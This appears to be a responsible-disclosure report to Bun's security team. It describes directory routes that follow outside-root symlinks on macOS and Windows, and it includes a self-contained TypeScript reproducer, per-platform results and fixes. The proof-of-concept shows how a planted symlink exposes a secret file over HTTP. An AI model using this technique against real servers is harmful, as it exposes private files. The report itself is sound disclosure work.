# Upstream Vulnerability Report: Bun Native Directory Routes ({ dir }) Follow Outside-Root Symlinks on macOS and Windows

**To:** security@bun.com  
**Date:** 2026-09-07  
**Reporter:** LugasJS Team (Rizky Zulkarnaen)  
**Affected Runtime:** Bun 1.4.0 (`34cbb9a40`)  
**Tested Platforms:**
- macOS arm64 (`macos-latest` runner, macOS 14/15) — **VULNERABLE**
- Windows x64 (`windows-latest` runner, Windows Server 2022/2025) — **VULNERABLE**
- Linux x86-64 (`ubuntu-latest` runner, Linux kernel 6.8+, Linux 5.6+) — **CONTAINED (PASS)**

---

## Summary

When mounting a directory route in `Bun.serve({ routes: { "/assets/*": { dir: "./public" } } })` (or wrapped in a method map `{ GET: { dir: "./public" } }`), Bun's HTTP server follows symbolic links located within `./public` that point outside the served directory tree on **macOS** and **Windows**, serving the external target file contents over HTTP with `200 OK`.

On **Linux**, Bun correctly contains directory routes at the filesystem root boundary via kernel `openat2(..., RESOLVE_IN_ROOT)`, returning a bare `404 Not Found` with zero body bytes when requesting an outside-root symlink.

Because `openat2` is a Linux-specific system call, the non-Linux platforms lack root-containment enforcement in Bun's directory routing, resulting in arbitrary file exposure if a symlink pointing outside the served tree exists in the mounted directory.

---

## Bounded Impact Assessment

This finding demonstrates disclosure through an **existing outside-root symbolic link** located within the mounted directory structure. It does not by itself establish arbitrary path traversal without an existing symlink (for example, verbatim dot-segment requests like `GET /assets/%2e%2e/file` are contained on all platforms). However, in deployments where untrusted files, archive extractions (e.g. tar/zip slip), user uploads, or repository checkouts contain outside-pointing symlinks inside served directories, Bun will expose the target files to HTTP clients on macOS and Windows.

---

## Minimal Standalone Reproducer

Run the following standalone script on macOS or Windows with `bun reproducer.ts`:

```ts
import { mkdtempSync, writeFileSync, symlinkSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

// 1. Create a secret file in an outside directory
const outsideDir = mkdtempSync(join(tmpdir(), "bun-outside-target-"));
const secretFile = join(outsideDir, "secret.txt");
const secretContent = `CONFIDENTIAL_DATA_${Date.now()}`;
writeFileSync(secretFile, secretContent, "utf8");

// 2. Create the public served directory
const publicDir = mkdtempSync(join(tmpdir(), "bun-public-mount-"));
const symlinkPath = join(publicDir, "leak.txt");
symlinkSync(secretFile, symlinkPath, "file");

// 3. Start Bun native directory route
const server = Bun.serve({
  port: 0,
  routes: {
    "/assets/*": { dir: publicDir },
  },
});

try {
  // 4. Request the symlink through the HTTP mount
  const response = await fetch(`http://127.0.0.1:${server.port}/assets/leak.txt`);
  const body = await response.text();

  console.log("Platform:", process.platform, process.arch);
  console.log("Bun version:", Bun.version);
  console.log("HTTP Status:", response.status);
  console.log("Exposed secret matches:", body.trim() === secretContent);

  if (response.status === 200 && body.includes(secretContent)) {
    console.error("VULNERABILITY CONFIRMED: Outside-root file exposed over HTTP!");
  } else if (response.status === 404) {
    console.log("CONTAINED: Symlink was not exposed (returned 404).");
  }
} finally {
  server.stop(true);
  rmSync(outsideDir, { recursive: true, force: true });
  rmSync(publicDir, { recursive: true, force: true });
}
```

### Observed Results

- **Linux x86-64 (Ubuntu 24.04, Bun 1.4.0):**
  ```
  Platform: linux x64
  Bun version: 1.4.0
  HTTP Status: 404
  Exposed secret matches: false
  CONTAINED: Symlink was not exposed (returned 404).
  ```

- **macOS ARM64 (macOS 15, Bun 1.4.0):**
  ```
  Platform: darwin arm64
  Bun version: 1.4.0
  HTTP Status: 200
  Exposed secret matches: true
  VULNERABILITY CONFIRMED: Outside-root file exposed over HTTP!
  ```

- **Windows x64 (Windows Server 2022, Bun 1.4.0):**
  ```
  Platform: win32 x64
  Bun version: 1.4.0
  HTTP Status: 200
  Exposed secret matches: true
  VULNERABILITY CONFIRMED: Outside-root file exposed over HTTP!
  ```

---

## Suggested Remediation

On non-Linux platforms where `openat2(RESOLVE_IN_ROOT)` is unavailable, Bun should either:
1. Resolve canonical paths via `realpath` before opening files and verify that `resolvedPath.startsWith(rootDirectory + pathSeparator)`, refusing to serve if the path escapes the root directory.
2. Or reject following symbolic links during file dispatch in directory mounts unless explicitly opted-in by configuration.
